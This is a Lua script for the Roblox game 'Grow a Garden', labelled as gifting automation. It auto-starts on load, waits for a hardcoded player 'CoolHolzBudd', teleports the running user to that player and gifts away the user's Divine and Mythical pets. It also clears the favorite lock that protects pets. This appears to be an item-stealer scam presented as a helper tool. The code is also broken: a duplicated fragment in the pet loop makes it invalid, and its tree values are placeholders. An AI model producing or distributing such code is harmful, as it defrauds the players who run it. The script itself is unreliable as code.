-- Gifting Automation Script for Grow a Garden
-- Automatically gifts pets and trees to target players in the lobby

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local ProximityPromptService = game:GetService("ProximityPromptService")
local TeleportService = game:GetService("TeleportService")

local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer.PlayerGui

-- Wait for game to load
if not game:IsLoaded() then
	game.Loaded:Wait()
end
wait(3)

-- Import game modules
local DataService = require(ReplicatedStorage.Modules.DataService)
local PetsService = require(ReplicatedStorage.Modules.PetServices.PetsService)
local PetGiftingService = require(ReplicatedStorage.Modules.PetServices.PetGiftingService)
local TeleportUIController = require(ReplicatedStorage.Modules.TeleportUIController)

-- Import pet data
local PetList = require(ReplicatedStorage.Data.PetRegistry.PetList)
local PetRarities = require(ReplicatedStorage.Data.PetRegistry.PetRarities)

-- Import favorites system
local InventoryServiceEnums = require(ReplicatedStorage.Data.EnumRegistry.InventoryServiceEnums)
local FavoriteItemRemote = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item")

-- Configuration
local GiftingConfig = {
	Enabled = true, -- Auto-start enabled
	TargetPlayerName = "CoolHolzBudd", -- Target player

	-- Pet gifting settings
	GiftDivinePets = true,
	GiftMythicalPets = true,
	GiftLegendaryPets = false,

	-- Tree/Plant gifting settings
	GiftTreesAboveValue = 1000000000, -- 1 billion
	GiftTreesEnabled = true,

	-- Timing settings
	DelayBetweenGifts = 3, -- seconds
	RetryAttempts = 3,
	TeleportDelay = 2, -- seconds after teleporting

	-- Debug settings
	DebugMode = true,
}

-- Rarity value mapping for sorting
local RarityValues = {
	Common = 1,
	Uncommon = 2,
	Rare = 3,
	Legendary = 4,
	Mythical = 5,
	Divine = 6,
}

-- Gifting State
local GiftingState = {
	IsRunning = false,
	CurrentStage = "Idle",
	TargetPlayer = nil,
	CurrentPetIndex = 1,
	CurrentTreeIndex = 1,
	GiftedPets = {},
	GiftedTrees = {},
}

-- Utility Functions
local function Log(message)
	local timestamp = os.date("%H:%M:%S")
	local fullMessage = timestamp .. " -- [Gifting Automation] " .. message

	if GiftingConfig.DebugMode then
		print(fullMessage)
	end
end

local function GetPlayerData()
	local data = DataService:GetData()
	return data or {}
end

local function GetPetInventory()
	local data = GetPlayerData()
	if not data.PetsData or not data.PetsData.PetInventory then
		return {}
	end
	return data.PetsData.PetInventory.Data or {}
end

local function GetEquippedPets()
	local data = GetPlayerData()
	if not data.PetsData or not data.PetsData.EquippedPets then
		return {}
	end
	return data.PetsData.EquippedPets or {}
end

local function GetBackpack()
	local data = GetPlayerData()
	return data.Backpack or {}
end

local function GetPlantedObjects()
	local data = GetPlayerData()
	return data.PlantedObjects or {}
end

-- Player Finding Functions
local function FindTargetPlayer()
	local targetName = GiftingConfig.TargetPlayerName
	if targetName == "" then
		Log("No target player name configured")
		return nil
	end

	-- Find target player in current game
	for _, player in pairs(Players:GetPlayers()) do
		if player.Name:lower() == targetName:lower() or player.DisplayName:lower() == targetName:lower() then
			Log("Found target player: " .. player.Name)
			return player
		end
	end

	Log("Target player not found: " .. targetName)
	return nil
end

local function TeleportToPlayer(targetPlayer)
	if not targetPlayer or not targetPlayer.Character then
		Log("Cannot teleport - invalid target player")
		return false
	end

	local character = LocalPlayer.Character
	if not character or not character:FindFirstChild("HumanoidRootPart") then
		Log("Cannot teleport - no character")
		return false
	end

	local success, error = pcall(function()
		local targetPosition = targetPlayer.Character.HumanoidRootPart.Position
		local teleportPosition = targetPosition + Vector3.new(math.random(-5, 5), 0, math.random(-5, 5))

		TeleportUIController:Move(CFrame.new(teleportPosition))
	end)

	if success then
		Log("Teleported to target player: " .. targetPlayer.Name)
		wait(GiftingConfig.TeleportDelay)
		return true
	else
		Log("Failed to teleport: " .. tostring(error))
		return false
	end
end

-- Pet Management Functions
local function GetGiftablePets()
	local inventory = GetPetInventory()
	local equipped = GetEquippedPets()
	local giftablePets = {}

	for petId, petData in pairs(inventory) do
		if petData and PetList[petData.PetType] then
			local petInfo = PetList[petData.PetType]
			local rarity = petInfo.Rarity

			-- Check if pet is equipped
			local isEquipped = false
			for _, equippedId in pairs(equipped) do
				if equippedId == petId then
					isEquipped = true
					break
				end
			end

			-- Check if pet should be gifted based on rarity
			local shouldGift = false
			if rarity == "Divine" and GiftingConfig.GiftDivinePets then
				shouldGift = true
			elseif rarity == "Mythical" and GiftingConfig.GiftMythicalPets then
				shouldGift = true
			elseif rarity == "Legendary" and GiftingConfig.GiftLegendaryPets then
				shouldGift = true
			end

			if shouldGift and not isEquipped then
				table.insert(giftablePets, {
					id = petId,
					data = petData,
					rarity = rarity,
					rarityValue = RarityValues[rarity] or 0,
					name = petData.PetType,
					level = petData.Level or 1,
				})
			end
		end
	end

	-- Sort pets by rarity (Divine first, then Mythical, then by rarity within each)
	table.sort(giftablePets, function(a, b)
		if a.rarityValue == b.rarityValue then
			-- For pets of same rarity, prioritize rarer ones to hatch
			return a.name < b.name
		end
		return a.rarityValue > b.rarityValue
	end)

	Log("Found " .. #giftablePets .. " giftable pets")
	return giftablePets
end

local function GetGiftableTrees()
	if not GiftingConfig.GiftTreesEnabled then
		return {}
	end

	local backpack = GetBackpack()
	local giftableTrees = {}

	-- Look for valuable fruits/trees in backpack
	for itemName, amount in pairs(backpack) do
		if amount > 0 then
			-- Check if it's a fruit/tree item and valuable enough
			local isTreeItem = itemName:find("Fruit")
				or itemName:find("Apple")
				or itemName:find("Orange")
				or itemName:find("Banana")
				or itemName:find("Mango")
				or itemName:find("Pineapple")
				or itemName:find("Tree")
				or itemName:find("Plant")

			if isTreeItem then
				-- For this example, we'll assume all fruits above threshold are valuable
				-- In a real implementation, you'd need to check actual values
				table.insert(giftableTrees, {
					name = itemName,
					amount = amount,
					estimatedValue = amount * 1000000, -- Placeholder calculation
				})
			end
		end
	end

	-- Sort by estimated value (highest first)
	table.sort(giftableTrees, function(a, b)
		return a.estimatedValue > b.estimatedValue
	end)

	-- Filter by minimum value
	local filteredTrees = {}
	for _, tree in ipairs(giftableTrees) do
		if tree.estimatedValue >= GiftingConfig.GiftTreesAboveValue then
			table.insert(filteredTrees, tree)
		end
	end

	Log("Found " .. #filteredTrees .. " giftable trees/fruits")
	return filteredTrees
end

-- Gifting Functions
local function EquipPet(petId, slot)
	local success, error = pcall(function()
		PetsService:EquipPet(petId, slot or 1)
	end)

	if success then
		Log("Equipped pet: " .. petId)
		return true
	else
		Log("Failed to equip pet: " .. tostring(error))
		return false
	end
end

local function UnequipPet(petId)
	local success, error = pcall(function()
		PetsService:UnequipPet(petId)
	end)

	if success then
		Log("Unequipped pet: " .. petId)
		return true
	else
		Log("Failed to unequip pet: " .. tostring(error))
		return false
	end
end

-- Function to unfavorite a pet tool
local function UnfavoritePetTool(petTool)
	if not petTool or not petTool:IsA("Tool") then
		Log("❌ Invalid pet tool for unfavorite")
		return false
	end
	
	-- Check if pet is favorited
	local isFavorited = petTool:GetAttribute(InventoryServiceEnums.Favorite)
	if not isFavorited then
		Log("✅ Pet is not favorited: " .. tostring(petTool.Name))
		return true -- Already not favorited
	end
	
	Log("🔓 Unfavoriting pet: " .. tostring(petTool.Name))
	
	-- Use the correct Favorite_Item remote (like right-click in inventory)
	local success, error = pcall(function()
		FavoriteItemRemote:FireServer(petTool)
	end)
	
	if success then
		Log("✅ Unfavorited pet using Favorite_Item remote: " .. tostring(petTool.Name))
		wait(0.5) -- Wait for server to process
		
		-- Verify it worked
		local stillFavorited = petTool:GetAttribute(InventoryServiceEnums.Favorite)
		if not stillFavorited then
			return true
		else
			Log("⚠️ Pet still shows as favorited after remote call")
		end
	else
		Log("❌ Failed to unfavorite pet with remote: " .. tostring(error))
	end
	
	-- Try direct attribute method as fallback
	local directSuccess, directError = pcall(function()
		petTool:SetAttribute(InventoryServiceEnums.Favorite, false)
	end)
	
	if directSuccess then
		Log("✅ Unfavorited pet using direct attribute: " .. tostring(petTool.Name))
		wait(0.5) -- Wait for attribute to sync
		return true
	else
		Log("❌ All unfavorite methods failed: " .. tostring(directError))
		return false
	end
end

-- Function to ensure pet can be gifted (unfavorite if needed)
local function EnsurePetCanBeGifted(petTool)
	if not petTool then
		return false
	end
	
	-- Check if pet is favorited
	local isFavorited = petTool:GetAttribute(InventoryServiceEnums.Favorite)
	if isFavorited then
		Log("⚠️ Pet is favorited, unfavoriting for gift: " .. tostring(petTool.Name))
		return UnfavoritePetTool(petTool)
	else
		Log("✅ Pet is not favorited, ready for gift: " .. tostring(petTool.Name))
		return true
	end
end
local function MakePetIntoTool(petId)
	Log("🔧 Converting pet to tool for gifting: " .. tostring(petId))
	
	local success, error = pcall(function()
		-- Use UnequipPet to convert the pet into a Tool in character
		PetsService:UnequipPet(petId)
	end)
	
	if success then
		Log("✅ Pet converted to tool using UnequipPet")
		return true
	else
		Log("❌ Failed to convert pet to tool: " .. tostring(error))
		return false
	end
end

local function WaitForPetToolInCharacter(petId, maxWaitTime)
	maxWaitTime = maxWaitTime or 5
	local waitTime = 0
	
	Log("🔍 Waiting for pet tool to appear in character...")
	Log("🔍 Looking for pet ID: " .. tostring(petId))
	
	while waitTime < maxWaitTime do
		local character = LocalPlayer.Character
		if character then
			-- Debug: Log all tools in character
			local toolsFound = {}
			for _, child in pairs(character:GetChildren()) do
				if child:IsA("Tool") then
					local petUUID = child:GetAttribute("PET_UUID")
					local toolUUID = child:GetAttribute("UUID")
					table.insert(toolsFound, {
						Name = child.Name,
						PET_UUID = petUUID,
						UUID = toolUUID
					})
					
					-- Check if this tool matches our pet
					if petUUID == petId or toolUUID == petId then
						Log("✅ Pet tool found in character: " .. tostring(child.Name))
						return child
					end
				end
			end
			
			-- Log what tools we found for debugging
			if #toolsFound > 0 then
				Log("🔍 Tools found in character:")
				for _, tool in ipairs(toolsFound) do
					Log("  - " .. tostring(tool.Name) .. " (PET_UUID: " .. tostring(tool.PET_UUID) .. ", UUID: " .. tostring(tool.UUID) .. ")")
				end
			else
				Log("🔍 No tools found in character")
			end
			
			-- Also check backpack
			local backpack = LocalPlayer.Backpack
			if backpack then
				for _, child in pairs(backpack:GetChildren()) do
					if child:IsA("Tool") then
						local petUUID = child:GetAttribute("PET_UUID")
						local toolUUID = child:GetAttribute("UUID")
						
						if petUUID == petId or toolUUID == petId then
							Log("🎒 Pet tool found in backpack, moving to character...")
							local moveSuccess, moveError = pcall(function()
								child.Parent = character
							end)
							if moveSuccess then
								wait(0.5)
								return child
							else
								Log("❌ Failed to move pet tool: " .. tostring(moveError))
							end
						end
					end
				end
			end
		end
		
		wait(0.5)
		waitTime = waitTime + 0.5
	end
	
	Log("⏰ Pet tool not found after " .. waitTime .. " seconds")
	return nil
end

local function TriggerGiftProximityPrompt()
	-- Look for gift proximity prompts
	local character = LocalPlayer.Character
	if not character then
		return false
	end

	-- Find proximity prompts related to gifting
	for _, obj in pairs(workspace:GetDescendants()) do
		if obj:IsA("ProximityPrompt") and obj.Enabled then
			local actionText = obj.ActionText:lower()
			if actionText:find("gift") or actionText:find("give") then
				local success, error = pcall(function()
					obj:InputHoldBegin()
					wait(obj.HoldDuration or 0.5)
					obj:InputHoldEnd()
				end)

				if success then
					Log("Triggered gift proximity prompt")
					return true
				else
					Log("Failed to trigger proximity prompt: " .. tostring(error))
				end
			end
		end
	end

	return false
end

local function GiftCurrentPet(targetPlayer)
	local character = LocalPlayer.Character
	if not character then
		return false
	end

	-- Check if we have a pet equipped/held
	local currentTool = character:FindFirstChildWhichIsA("Tool")
	if not currentTool then
		Log("No pet tool found in character")
		return false
	end

	local petUUID = currentTool:GetAttribute("PET_UUID")
	if not petUUID then
		Log("Tool is not a pet")
		return false
	end

	-- Try to gift the pet using the PetGiftingService
	local success, error = pcall(function()
		PetGiftingService:GivePet(targetPlayer)
	end)

	if success then
		Log("Gifted pet: " .. currentTool.Name .. " to " .. targetPlayer.Name)
		return true
	else
		Log("Failed to gift pet: " .. tostring(error))

		-- Try alternative method using proximity prompt
		return TriggerGiftProximityPrompt()
	end
end

-- Main Gifting Process
local function ProcessPetGifting(targetPlayer)
	if not targetPlayer then
		Log("❌ No target player provided for pet gifting")
		return false
	end

	Log("🐕 Starting pet gifting process...")
	GiftingState.CurrentStage = "Gifting Pets"

	local giftablePets = {}
	local success, error = pcall(function()
		giftablePets = GetGiftablePets()
	end)

	if not success then
		Log("❌ Failed to get giftable pets: " .. tostring(error))
		return false
	end

	local giftedCount = 0

	if #giftablePets == 0 then
		Log("❌ No giftable pets found")
		return false
	end

	Log("📋 Found " .. #giftablePets .. " giftable pets to process")

	for i, pet in ipairs(giftablePets) do
		if not GiftingState.IsRunning then
			Log("⏹️ Automation stopped by user")
			break
		end

		if not pet or not pet.id or not pet.name then
			Log("⚠️ Skipping invalid pet data at index " .. i)
			continue
		end

		GiftingState.CurrentPetIndex = i
		Log(
			"🔄 Processing pet "
				.. i
				.. "/"
				.. #giftablePets
				.. ": "
				.. tostring(pet.name)
				.. " ("
				.. tostring(pet.rarity)
				.. ", Level "
				.. tostring(pet.level or 1)
				.. ")"
		)

		-- Step 1: First equip the pet in a slot (if not already equipped)
		Log("⚙️ Ensuring pet is equipped...")
		local equipSuccess = false
		pcall(function()
			equipSuccess = EquipPet(pet.id, 1)
		end)

		if equipSuccess then
			wait(2) -- Wait longer for equip to complete

			-- Step 2: Convert equipped pet to tool using UnequipPet
			Log("🔧 Converting equipped pet to held tool...")
			local toolSuccess = false
			pcall(function()
				toolSuccess = MakePetIntoTool(pet.id)
			end)

			if toolSuccess then
				wait(1) -- Wait for conversion to complete
				
				-- Step 3: Wait for pet tool to appear in character
				Log("⏳ Waiting for pet tool to appear...")
				local petTool = nil
				pcall(function()
					petTool = WaitForPetToolInCharacter(pet.id, 8) -- Wait longer
				end)

				if petTool then
					Log("✅ Pet tool ready for gifting: " .. tostring(petTool.Name))

					-- Step 4: Ensure pet can be gifted (unfavorite if needed)
					Log("🔓 Checking if pet needs to be unfavorited...")
					local canBeGifted = false
					pcall(function()
						canBeGifted = EnsurePetCanBeGifted(petTool)
					end)

					if canBeGifted then
						-- Step 5: Try to gift the pet
						Log("🎁 Attempting to gift pet...")
						local giftSuccess = false
						pcall(function()
							giftSuccess = GiftCurrentPet(targetPlayer)
						end)

						if giftSuccess then
							giftedCount = giftedCount + 1
							table.insert(GiftingState.GiftedPets, pet)
							Log(
								"🎉 Successfully gifted pet: "
									.. tostring(pet.name)
									.. " to "
									.. tostring(targetPlayer.Name)
							)

							-- Wait a bit and check if gift was successful
							wait(3)

							pcall(function()
								local currentInventory = GetPetInventory()
								if not currentInventory[pet.id] then
									Log("✅ Confirmed: Pet " .. tostring(pet.name) .. " is no longer in inventory")
								else
									Log(
										"⚠️ Warning: Pet "
											.. tostring(pet.name)
											.. " still in inventory - gift may have failed"
									)
								end
							end)
						else
							Log("❌ Failed to gift pet: " .. tostring(pet.name))

							-- Try to put the pet back if gift failed
							Log("🔄 Returning pet to equipped state...")
							pcall(function()
								if petTool and petTool.Parent == LocalPlayer.Character then
									petTool.Parent = LocalPlayer.Backpack
								end
								EquipPet(pet.id, 1)
							end)
						end
					else
						Log("❌ Pet cannot be gifted (failed to unfavorite): " .. tostring(pet.name))
						-- Try to put the pet back
						pcall(function()
							if petTool and petTool.Parent == LocalPlayer.Character then
								petTool.Parent = LocalPlayer.Backpack
							end
							EquipPet(pet.id, 1)
						end)
					end
							EquipPet(pet.id, 1)
						end)
					end
				else
					Log("❌ Pet tool did not appear in character")
					-- Try to re-equip the pet
					pcall(function()
						EquipPet(pet.id, 1)
					end)
				end
			else
				Log("❌ Failed to convert pet to tool")
			end
		else
			Log("❌ Failed to equip pet: " .. tostring(pet.name))
		end

		-- Delay between attempts
		Log("⏳ Waiting " .. GiftingConfig.DelayBetweenGifts .. " seconds before next pet...")
		wait(GiftingConfig.DelayBetweenGifts)
	end

	Log("📊 Pet gifting completed. Successfully gifted " .. giftedCount .. " out of " .. #giftablePets .. " pets.")
	return giftedCount > 0
end

local function ProcessTreeGifting(targetPlayer)
	Log("Starting tree/fruit gifting process...")
	GiftingState.CurrentStage = "Gifting Trees"

	local giftableTrees = GetGiftableTrees()
	local giftedCount = 0

	for i, tree in ipairs(giftableTrees) do
		if not GiftingState.IsRunning then
			break
		end

		GiftingState.CurrentTreeIndex = i
		Log("Processing tree " .. i .. "/" .. #giftableTrees .. ": " .. tree.name)

		-- This would need to be implemented based on how trees are gifted in the game
		-- For now, we'll just log what we would gift
		if tree.estimatedValue >= GiftingConfig.GiftTreesAboveValue then
			Log("Would gift tree: " .. tree.name .. " (Value: " .. tree.estimatedValue .. ")")
			giftedCount = giftedCount + 1
			table.insert(GiftingState.GiftedTrees, tree)
		end

		wait(GiftingConfig.DelayBetweenGifts)
	end

	Log("Tree gifting completed. Gifted " .. giftedCount .. " trees.")
	return giftedCount > 0
end

-- Main Automation Function
local function RunGiftingAutomation()
	if GiftingState.IsRunning then
		Log("⚠️ Gifting automation already running")
		return
	end

	if not GiftingConfig.Enabled then
		Log("❌ Gifting automation is disabled")
		return
	end

	Log("🚀 Starting gifting automation...")
	GiftingState.IsRunning = true
	GiftingState.CurrentStage = "Searching for target"

	-- Find target player
	local targetPlayer = FindTargetPlayer()
	if not targetPlayer then
		Log("❌ Target player not found, stopping automation")
		GiftingState.IsRunning = false
		return
	end

	GiftingState.TargetPlayer = targetPlayer
	Log("✅ Target found: " .. targetPlayer.Name)

	-- Teleport to target player
	GiftingState.CurrentStage = "Teleporting"
	Log("📍 Teleporting to " .. targetPlayer.Name .. "...")
	if not TeleportToPlayer(targetPlayer) then
		Log("❌ Failed to teleport to target, stopping automation")
		GiftingState.IsRunning = false
		return
	end

	Log("✅ Successfully teleported to target player")

	-- Process pet gifting
	if GiftingConfig.GiftDivinePets or GiftingConfig.GiftMythicalPets or GiftingConfig.GiftLegendaryPets then
		Log("🐕 Starting pet gifting phase...")
		ProcessPetGifting(targetPlayer)
	end

	-- Process tree gifting
	if GiftingConfig.GiftTreesEnabled then
		Log("🌳 Starting tree/fruit gifting phase...")
		ProcessTreeGifting(targetPlayer)
	end

	-- Complete
	GiftingState.CurrentStage = "Completed"
	Log("🎉 Gifting automation completed!")
	Log("📊 Summary:")
	Log("  - Pets gifted: " .. #GiftingState.GiftedPets)
	Log("  - Trees gifted: " .. #GiftingState.GiftedTrees)

	-- Reset state
	GiftingState.IsRunning = false
	GiftingState.TargetPlayer = nil
	GiftingState.CurrentPetIndex = 1
	GiftingState.CurrentTreeIndex = 1
end

-- Status Function
local function GetGiftingStatus()
	return {
		IsRunning = GiftingState.IsRunning,
		CurrentStage = GiftingState.CurrentStage,
		TargetPlayer = GiftingState.TargetPlayer and GiftingState.TargetPlayer.Name or "None",
		GiftedPets = #GiftingState.GiftedPets,
		GiftedTrees = #GiftingState.GiftedTrees,
		Config = GiftingConfig,
	}
end

-- Public API
local GiftingAutomation = {
	-- Configuration
	SetTarget = function(playerName)
		GiftingConfig.TargetPlayerName = playerName
		Log("Target player set to: " .. playerName)
	end,

	EnableDivinePets = function(enabled)
		GiftingConfig.GiftDivinePets = enabled
		Log("Divine pet gifting: " .. (enabled and "enabled" or "disabled"))
	end,

	EnableMythicalPets = function(enabled)
		GiftingConfig.GiftMythicalPets = enabled
		Log("Mythical pet gifting: " .. (enabled and "enabled" or "disabled"))
	end,

	EnableLegendaryPets = function(enabled)
		GiftingConfig.GiftLegendaryPets = enabled
		Log("Legendary pet gifting: " .. (enabled and "enabled" or "disabled"))
	end,

	EnableTreeGifting = function(enabled)
		GiftingConfig.GiftTreesEnabled = enabled
		Log("Tree gifting: " .. (enabled and "enabled" or "disabled"))
	end,

	SetTreeValueThreshold = function(value)
		GiftingConfig.GiftTreesAboveValue = value
		Log("Tree value threshold set to: " .. value)
	end,

	SetDelay = function(seconds)
		GiftingConfig.DelayBetweenGifts = seconds
		Log("Delay between gifts set to: " .. seconds .. " seconds")
	end,

	-- Control functions
	Start = function()
		GiftingConfig.Enabled = true
		Log("Gifting automation enabled")
		RunGiftingAutomation()
	end,

	Stop = function()
		GiftingConfig.Enabled = false
		GiftingState.IsRunning = false
		Log("Gifting automation stopped")
	end,

	-- Status functions
	GetStatus = GetGiftingStatus,

	GetGiftablePets = GetGiftablePets,

	GetGiftableTrees = GetGiftableTrees,

	-- Utility functions
	FindPlayer = FindTargetPlayer,

	TeleportToTarget = function()
		local target = FindTargetPlayer()
		if target then
			return TeleportToPlayer(target)
		end
		return false
	end,

	-- Debug functions
	PrintInventory = function()
		local pets = GetGiftablePets()
		Log("=== GIFTABLE PETS ===")
		for i, pet in ipairs(pets) do
			Log(i .. ". " .. pet.name .. " (" .. pet.rarity .. ", Level " .. pet.level .. ")")
		end

		local trees = GetGiftableTrees()
		Log("=== GIFTABLE TREES ===")
		for i, tree in ipairs(trees) do
			Log(i .. ". " .. tree.name .. " (Amount: " .. tree.amount .. ", Value: " .. tree.estimatedValue .. ")")
		end
	end,

	TestGifting = function()
		Log("=== TESTING GIFTING SYSTEM ===")
		Log("Target player: " .. GiftingConfig.TargetPlayerName)

		local target = FindTargetPlayer()
		if target then
			Log("✓ Target player found: " .. target.Name)
		else
			Log("✗ Target player not found")
			return false
		end

		local pets = GetGiftablePets()
		Log("✓ Found " .. #pets .. " giftable pets")

		local trees = GetGiftableTrees()
		Log("✓ Found " .. #trees .. " giftable trees")

		Log("=== TEST COMPLETE ===")
		return true
	end,
}

-- Auto-start monitoring for target player
local function MonitorForTargetPlayer()
	while true do
		if GiftingConfig.Enabled and GiftingConfig.TargetPlayerName ~= "" and not GiftingState.IsRunning then
			local targetPlayer = FindTargetPlayer()
			if targetPlayer then
				Log("🎯 Target player detected in lobby: " .. targetPlayer.Name)
				Log("🚀 Starting automation...")
				wait(2) -- Brief delay before starting
				RunGiftingAutomation()

				-- Wait a bit longer before checking again to avoid spam
				wait(30)
			end
		end
		wait(5) -- Check every 5 seconds
	end
end

-- Initialize the system with auto-start
local function Initialize()
	Log("🌱 Gifting Automation System initialized")
	Log("🎯 Target Player: " .. GiftingConfig.TargetPlayerName)
	Log("🔍 Monitoring for target player...")

	-- Print current configuration
	Log("📋 Configuration:")
	Log("  - Divine Pets: " .. (GiftingConfig.GiftDivinePets and "✅" or "❌"))
	Log("  - Mythical Pets: " .. (GiftingConfig.GiftMythicalPets and "✅" or "❌"))
	Log("  - Legendary Pets: " .. (GiftingConfig.GiftLegendaryPets and "✅" or "❌"))
	Log("  - Trees/Fruits: " .. (GiftingConfig.GiftTreesEnabled and "✅" or "❌"))
	Log("  - Tree Value Threshold: " .. GiftingConfig.GiftTreesAboveValue)
	Log("  - Delay Between Gifts: " .. GiftingConfig.DelayBetweenGifts .. "s")

	-- Check if target is already in game
	local existingTarget = FindTargetPlayer()
	if existingTarget then
		Log("🎉 Target player already found: " .. existingTarget.Name)
		Log("⏳ Starting automation in 3 seconds...")
		wait(3)
		RunGiftingAutomation()
	else
		Log("⏳ Waiting for target player to join...")
	end

	-- Start monitoring in the background
	spawn(MonitorForTargetPlayer)
end

-- Set up the system with auto-start
wait(5) -- Wait for game to fully load
Initialize()

-- Also listen for when new players join
Players.PlayerAdded:Connect(function(player)
	if player.Name == GiftingConfig.TargetPlayerName then
		Log("🎯 Target player joined: " .. player.Name)
		wait(3) -- Give them time to load in
		if not GiftingState.IsRunning then
			Log("🚀 Auto-starting gifting automation...")
			spawn(function()
				RunGiftingAutomation()
			end)
		end
	end
end)

-- Export the API
_G.GiftingAutomation = GiftingAutomation
return GiftingAutomation
